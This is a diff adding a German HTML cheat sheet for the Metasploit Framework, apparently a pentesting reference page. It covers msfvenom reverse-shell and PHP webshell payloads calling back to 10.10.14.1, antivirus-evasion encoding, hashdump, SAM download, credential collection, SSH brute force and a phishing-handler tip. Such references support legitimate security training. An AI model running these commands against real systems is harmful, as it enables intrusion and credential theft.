@@ -1,0 +1,464 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Metasploit Framework - TheLayer0Guide</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Syne:wght@400;600;800&display=swap" rel="stylesheet">
+<link rel="icon" type="image/svg+xml" href="../assets/metasploit.svg">
+<style>
+  :root{--bg:#0d1117;--surface:#161b22;--border:#30363d;--accent:#2563eb;--accent2:#60a5fa;--green:#3fb950;--purple:#a371f7;--cyan:#39c5cf;--red:#f47067;--text:#e6edf3;--muted:#7d8590;--code-bg:#10161d;}
+  *{margin:0;padding:0;box-sizing:border-box;}
+  body{background:var(--bg);color:var(--text);font-family:'Syne',sans-serif;min-height:100vh;}
+  header{background:linear-gradient(135deg,#0d1117 0%,#001229 50%,#0d1117 100%);border-bottom:2px solid var(--accent);padding:40px 48px 32px;position:relative;overflow:hidden;}
+  header::before{content:'';position:absolute;inset:0;background:radial-gradient(ellipse 600px 200px at 60% 50%,rgba(37,99,235,.08),transparent);}
+  .header-grid{display:grid;grid-template-columns:1fr auto;align-items:end;gap:24px;position:relative;}
+  .badge{display:inline-block;font-family:'JetBrains Mono',monospace;font-size:10px;font-weight:600;color:var(--accent);background:rgba(37,99,235,.1);border:1px solid rgba(37,99,235,.3);padding:3px 10px;border-radius:3px;letter-spacing:2px;text-transform:uppercase;margin-bottom:12px;}
+  h1{font-size:clamp(28px,4vw,48px);font-weight:800;letter-spacing:-1px;line-height:1.1;color:var(--text);}
+  h1 span{color:var(--accent);}
+  .subtitle{color:var(--muted);font-size:14px;margin-top:8px;font-family:'JetBrains Mono',monospace;}
+  .meta{text-align:right;font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--muted);line-height:1.8;}
+  .meta strong{color:var(--accent2);}
+  .version-legend{margin-top:18px;display:flex;gap:10px;flex-wrap:wrap;}
+  .chip{font-family:'JetBrains Mono',monospace;font-size:11px;border-radius:4px;padding:4px 12px;font-weight:600;}
+  .ch-bl{background:rgba(37,99,235,.1);border:1px solid rgba(37,99,235,.3);color:var(--accent);}
+  .ch-gn{background:rgba(63,185,80,.1);border:1px solid rgba(63,185,80,.3);color:var(--green);}
+  .ch-cy{background:rgba(57,197,207,.1);border:1px solid rgba(57,197,207,.3);color:var(--cyan);}
+  .ch-pu{background:rgba(163,113,247,.1);border:1px solid rgba(163,113,247,.3);color:var(--purple);}
+  .ch-re{background:rgba(244,112,103,.1);border:1px solid rgba(244,112,103,.3);color:var(--red);}
+  main{padding:32px 48px;max-width:1400px;margin:0 auto;columns:3;column-gap:20px;}
+  .section{break-inside:avoid;margin-bottom:20px;background:var(--surface);border:1px solid var(--border);border-radius:8px;overflow:hidden;}
+  .section-header{display:flex;align-items:center;gap:10px;padding:12px 16px;border-bottom:1px solid var(--border);}
+  .section-icon{width:28px;height:28px;border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:14px;flex-shrink:0;}
+  .section-title{font-size:13px;font-weight:600;letter-spacing:.5px;text-transform:uppercase;}
+  .th-bl .section-header{background:rgba(37,99,235,.06);} .th-bl .section-icon{background:rgba(37,99,235,.15);} .th-bl .section-title{color:var(--accent);}
+  .th-gn .section-header{background:rgba(63,185,80,.06);} .th-gn .section-icon{background:rgba(63,185,80,.15);} .th-gn .section-title{color:var(--green);}
+  .th-cy .section-header{background:rgba(57,197,207,.06);} .th-cy .section-icon{background:rgba(57,197,207,.15);} .th-cy .section-title{color:var(--cyan);}
+  .th-pu .section-header{background:rgba(163,113,247,.06);} .th-pu .section-icon{background:rgba(163,113,247,.15);} .th-pu .section-title{color:var(--purple);}
+  .th-re .section-header{background:rgba(244,112,103,.06);} .th-re .section-icon{background:rgba(244,112,103,.15);} .th-re .section-title{color:var(--red);}
+  .command-list{padding:8px 0;}
+  .cmd-entry{padding:6px 16px;border-bottom:1px solid rgba(48,54,61,.5);}
+  .cmd-entry:last-child{border-bottom:none;}
+  .cmd-desc{font-size:10px;color:var(--muted);margin-bottom:3px;letter-spacing:.3px;text-transform:uppercase;}
+  code{font-family:'JetBrains Mono',monospace;font-size:11.5px;color:var(--text);background:var(--code-bg);display:block;padding:5px 9px;border-radius:4px;line-height:1.6;white-space:pre-wrap;word-break:break-all;}
+  .kw{color:#60a5fa;font-weight:700;} .st{color:#3fb950;} .nu{color:#f47067;}
+  .cm{color:#7d8590;font-style:italic;} .fn{color:#39c5cf;font-weight:600;}
+  .tip{padding:8px 16px;background:rgba(37,99,235,.06);border-left:3px solid var(--accent);font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--muted);line-height:1.6;}
+  .tip strong{color:var(--text);}
+  .nav-link{position:absolute;top:40px;right:48px;z-index:10;font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--accent);text-decoration:none;border:1px solid rgba(37,99,235,.3);padding:4px 12px;border-radius:4px;background:rgba(37,99,235,.08);}
+  .nav-link:hover{background:rgba(37,99,235,.15);}
+  @media(max-width:1100px){main{columns:2;}}
+  @media(max-width:700px){main{columns:1;padding:16px;}header{padding:24px 16px;}}
+</style>
+</head>
+<body>
+<header>
+  <a href="../index.html" class="nav-link">← Index</a>
+  <div class="header-grid">
+    <div>
+      <div class="badge">▸ Security &amp; Pentesting Reference</div>
+      <img src="../assets/metasploit.svg" alt="Logo" style="width:48px;height:48px;margin-bottom:12px;display:block;filter:brightness(0) invert(1)">
+      <h1><span>Metasploit</span> Framework<br>TheLayer<span style="color:#a371f7;font-family:'JetBrains Mono',monospace;font-size:1.25em;-webkit-text-fill-color:#a371f7;">0</span>Guide</h1>
+      <p class="subtitle">$ msfconsole -q</p>
+      <div class="version-legend">
+        <div class="chip ch-bl">MSF 6.x</div>
+        <div class="chip ch-gn">msfvenom</div>
+        <div class="chip ch-cy">Meterpreter</div>
+        <div class="chip ch-pu">Post-Exploitation</div>
+      </div>
+    </div>
+    <div class="meta"><strong>Metasploit Framework</strong><br>Exploit · Payload · Session<br>Auxiliary · Post · msfvenom<br>Handler · Database · Loot</div>
+  </div>
+</header>
+<main>
+
+<!-- 1. msfconsole Grundlagen -->
+<div class="section th-bl">
+  <div class="section-header"><div class="section-icon">🖥</div><div class="section-title">msfconsole Grundlagen</div></div>
+  <div class="command-list">
+    <div class="cmd-entry">
+      <div class="cmd-desc">Starten (quiet, kein Banner)</div>
+      <code>msfconsole -q</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Starten mit Resource-Script</div>
+      <code>msfconsole -r setup.rc</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Hilfe / Befehlsübersicht</div>
+      <code>help
+help search          <span class="cm"># Hilfe zu einzelnem Befehl</span></code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Befehlshistorie</div>
+      <code>history</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Modul neu laden / Framework neu laden</div>
+      <code>reload_all           <span class="cm"># alle Module neu laden</span>
+loadpath /opt/modules <span class="cm"># Custom-Pfad laden</span></code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Beenden</div>
+      <code>exit
+exit -y              <span class="cm"># ohne Rückfrage</span></code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Variablen global setzen / löschen</div>
+      <code>setg LHOST 10.10.14.1
+unsetg LHOST</code>
+    </div>
+    <div class="tip"><strong>Tipp:</strong> Mit <strong>Tab</strong> werden Befehle und Optionsnamen auto-vervollständigt. Pfeiltaste hoch/runter für Verlauf.</div>
+  </div>
+</div>
+
+<!-- 2. Workspaces -->
+<div class="section th-cy">
+  <div class="section-header"><div class="section-icon">📁</div><div class="section-title">Workspaces</div></div>
+  <div class="command-list">
+    <div class="cmd-entry">
+      <div class="cmd-desc">Workspaces anzeigen / aktuellen anzeigen</div>
+      <code>workspace
+workspace -v         <span class="cm"># mit Details</span></code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Workspace erstellen / wechseln</div>
+      <code>workspace -a pentest1
+workspace pentest1</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Workspace löschen</div>
+      <code>workspace -d pentest1</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Nach Workspace suchen</div>
+      <code>workspace -S pentest</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Nmap-XML importieren</div>
+      <code>db_import /tmp/scan.xml</code>
+    </div>
+    <div class="tip"><strong>Hinweis:</strong> Workspaces isolieren Hosts, Services und Loot pro Engagement. Vor jedem neuen Auftrag neuen Workspace anlegen.</div>
+  </div>
+</div>
+
+<!-- 3. Suchen & Laden -->
+<div class="section th-bl">
+  <div class="section-header"><div class="section-icon">🔍</div><div class="section-title">Suchen &amp; Laden</div></div>
+  <div class="command-list">
+    <div class="cmd-entry">
+      <div class="cmd-desc">Volltextsuche</div>
+      <code>search eternalblue</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Gefilterte Suche</div>
+      <code>search type:exploit platform:linux
+search type:auxiliary name:smb
+search cve:2021-44228</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Modul per Nummer oder Pfad laden</div>
+      <code>use 0
+use exploit/windows/smb/ms17_010_eternalblue</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Modulinformationen anzeigen</div>
+      <code>info</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Optionen anzeigen</div>
+      <code>options
+advanced            <span class="cm"># erweiterte Optionen</span></code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Kompatible Payloads auflisten</div>
+      <code>show payloads</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Modul zurücksetzen</div>
+      <code>back</code>
+    </div>
+  </div>
+</div>
+
+<!-- 4. Exploit ausführen -->
+<div class="section th-re">
+  <div class="section-header"><div class="section-icon">💥</div><div class="section-title">Exploit ausführen</div></div>
+  <div class="command-list">
+    <div class="cmd-entry">
+      <div class="cmd-desc">Ziel und Listener konfigurieren</div>
+      <code>set RHOSTS 192.168.1.100
+set RHOST 192.168.1.100   <span class="cm"># Einzel-Ziel</span>
+set LHOST 10.10.14.1
+set LPORT 4444</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Payload setzen</div>
+      <code>set PAYLOAD windows/x64/meterpreter/reverse_tcp</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Exploit-Ziel auswählen</div>
+      <code>show targets
+set TARGET 0</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Prüfen ob Ziel verwundbar ist</div>
+      <code>check</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Exploit starten</div>
+      <code>run
+exploit             <span class="cm"># Alias für run</span>
+run -j              <span class="cm"># als Job im Hintergrund</span></code>
+    </div>
+    <div class="tip"><strong>Tipp:</strong> <strong>RHOSTS</strong> akzeptiert CIDR-Ranges (<code>192.168.1.0/24</code>), Dateilisten (<code>file:/tmp/hosts.txt</code>) und Bereiche (<code>192.168.1.1-50</code>).</div>
+  </div>
+</div>
+
+<!-- 5. Payloads & msfvenom -->
+<div class="section th-gn">
+  <div class="section-header"><div class="section-icon">🧪</div><div class="section-title">Payloads &amp; msfvenom</div></div>
+  <div class="command-list">
+    <div class="cmd-entry">
+      <div class="cmd-desc">Alle Payloads auflisten</div>
+      <code>msfvenom -l payloads
+msfvenom -l payloads | grep windows</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Windows Reverse-TCP Meterpreter (EXE)</div>
+      <code>msfvenom -p windows/x64/meterpreter/reverse_tcp \
+  LHOST=10.10.14.1 LPORT=4444 \
+  -f exe -o shell.exe</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Linux Reverse Shell (ELF)</div>
+      <code>msfvenom -p linux/x64/shell_reverse_tcp \
+  LHOST=10.10.14.1 LPORT=4444 \
+  -f elf -o shell.elf</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">PHP Webshell</div>
+      <code>msfvenom -p php/meterpreter_reverse_tcp \
+  LHOST=10.10.14.1 LPORT=4444 \
+  -f raw -o shell.php</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Encoder verwenden (Antivirus-Umgehung)</div>
+      <code>msfvenom -p windows/x64/meterpreter/reverse_tcp \
+  LHOST=10.10.14.1 LPORT=4444 \
+  -e x64/xor_dynamic -i 5 \
+  -f exe -o encoded.exe</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Staged vs. Stageless</div>
+      <code><span class="cm"># Staged (benötigt Handler):</span>
+windows/x64/meterpreter/reverse_tcp
+<span class="cm"># Stageless (alles in einer Datei):</span>
+windows/x64/meterpreter_reverse_tcp</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Payload-Optionen anzeigen</div>
+      <code>msfvenom -p windows/x64/meterpreter/reverse_tcp \
+  --list-options</code>
+    </div>
+    <div class="tip"><strong>Staged</strong> (<code>/</code>-Trennung): kleiner Stub lädt Stage 2 vom Handler nach. <strong>Stageless</strong> (<code>_</code>): vollständiger Payload in einer Datei — kein Handler nötig für die Lieferung.</div>
+  </div>
+</div>
+
+<!-- 6. Sessions -->
+<div class="section th-bl">
+  <div class="section-header"><div class="section-icon">🔗</div><div class="section-title">Sessions</div></div>
+  <div class="command-list">
+    <div class="cmd-entry">
+      <div class="cmd-desc">Alle aktiven Sessions anzeigen</div>
+      <code>sessions -l
+sessions -v          <span class="cm"># ausführlich</span></code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Session öffnen / interagieren</div>
+      <code>sessions -i 1</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Session in den Hintergrund legen</div>
+      <code><span class="cm"># In einer Meterpreter-Session:</span>
+background
+<span class="cm"># Tastenkombination:</span>
+Ctrl+Z</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Session beenden / alle beenden</div>
+      <code>sessions -k 1
+sessions -K          <span class="cm"># alle Sessions beenden</span></code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Shell-Session auf Meterpreter upgraden</div>
+      <code>sessions -u 1</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Befehl in Session ausführen (ohne Interaktion)</div>
+      <code>sessions -C sysinfo -i 1</code>
+    </div>
+    <div class="tip"><strong>Tipp:</strong> Nach einem Upgrade mit <strong>-u</strong> wird automatisch ein multi/handler-Listener gestartet und die neue Meterpreter-Session in der Liste angezeigt.</div>
+  </div>
+</div>
+
+<!-- 7. Post-Exploitation (Meterpreter) -->
+<div class="section th-pu">
+  <div class="section-header"><div class="section-icon">🛠</div><div class="section-title">Post-Exploitation (Meterpreter)</div></div>
+  <div class="command-list">
+    <div class="cmd-entry">
+      <div class="cmd-desc">Systeminformationen / aktueller Benutzer</div>
+      <code>sysinfo
+getuid</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Rechteerhöhung (Windows)</div>
+      <code>getsystem</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Passwort-Hashes dumpen (Windows)</div>
+      <code>hashdump</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Shell öffnen</div>
+      <code>shell</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Dateien hoch- und herunterladen</div>
+      <code>upload /tmp/tool.exe C:\\Windows\\Temp\\tool.exe
+download C:\\Windows\\System32\\SAM /tmp/SAM</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Prozesse anzeigen / migrieren</div>
+      <code>ps
+migrate 1234         <span class="cm"># in PID migrieren</span></code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Post-Module ausführen</div>
+      <code>run post/multi/recon/local_exploit_suggester
+run post/windows/gather/credentials/credential_collector</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Screenshot aufnehmen</div>
+      <code>screenshot</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Portweiterleitung (Pivoting)</div>
+      <code>portfwd add -l 8080 -p 80 -r 192.168.2.10</code>
+    </div>
+  </div>
+</div>
+
+<!-- 8. Listener einrichten -->
+<div class="section th-cy">
+  <div class="section-header"><div class="section-icon">📡</div><div class="section-title">Listener einrichten</div></div>
+  <div class="command-list">
+    <div class="cmd-entry">
+      <div class="cmd-desc">Multi-Handler laden</div>
+      <code>use exploit/multi/handler</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Payload und Optionen setzen</div>
+      <code>set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 10.10.14.1
+set LPORT 4444</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Handler als Hintergrund-Job starten</div>
+      <code>run -j</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Laufende Jobs anzeigen / stoppen</div>
+      <code>jobs -l
+jobs -k 0</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Handler für mehrere Verbindungen konfigurieren</div>
+      <code>set ExitOnSession false
+run -j</code>
+    </div>
+    <div class="tip"><strong>ExitOnSession false</strong> lässt den Handler aktiv, sodass mehrere Verbindungen vom selben Payload akzeptiert werden — wichtig bei Phishing-Kampagnen.</div>
+  </div>
+</div>
+
+<!-- 9. Auxiliary Module -->
+<div class="section th-gn">
+  <div class="section-header"><div class="section-icon">🔎</div><div class="section-title">Auxiliary Module</div></div>
+  <div class="command-list">
+    <div class="cmd-entry">
+      <div class="cmd-desc">SMB-Scanner</div>
+      <code>use auxiliary/scanner/smb/smb_ms17_010
+set RHOSTS 192.168.1.0/24
+set THREADS 10
+run</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Port-Scanner</div>
+      <code>use auxiliary/scanner/portscan/tcp
+set RHOSTS 192.168.1.0/24
+set PORTS 22,80,443,8080
+run</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">SSH-Bruteforce</div>
+      <code>use auxiliary/scanner/ssh/ssh_login
+set RHOSTS 192.168.1.100
+set USER_FILE /usr/share/wordlists/users.txt
+set PASS_FILE /usr/share/wordlists/rockyou.txt
+run</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">HTTP-Version ermitteln</div>
+      <code>use auxiliary/scanner/http/http_version
+set RHOSTS 192.168.1.0/24
+run</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">THREADS für schnelleres Scannen</div>
+      <code>set THREADS 50</code>
+    </div>
+    <div class="tip"><strong>Tipp:</strong> Auxiliary-Module haben kein Payload — sie erzeugen keine Session, sondern sammeln Informationen oder testen Konfigurationen.</div>
+  </div>
+</div>
+
+<!-- 10. Datenbank -->
+<div class="section th-bl">
+  <div class="section-header"><div class="section-icon">🗄</div><div class="section-title">Datenbank</div></div>
+  <div class="command-list">
+    <div class="cmd-entry">
+      <div class="cmd-desc">Datenbankstatus prüfen</div>
+      <code>db_status</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Nmap direkt in die DB scannen</div>
+      <code>db_nmap -sV -sC 192.168.1.0/24
+db_nmap -p 22,80,443 192.168.1.100</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Erkannte Hosts und Services</div>
+      <code>hosts
+hosts -c address,os_name,status
+services
+services -p 443</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Gefundene Schwachstellen</div>
+      <code>vulns</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Erbeutete Daten</div>
+      <code>loot
+notes
+creds</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Ergebnisse exportieren</div>
+      <code>db_export -f xml /tmp/report.xml</code>
+    </div>
+    <div class="tip"><strong>Voraussetzung:</strong> PostgreSQL muss laufen. Setup mit <strong><code>msfdb init</code></strong> (einmalig als root ausführen, vor msfconsole).</div>
+  </div>
+</div>
+
+</main>
+</body>
+</html>
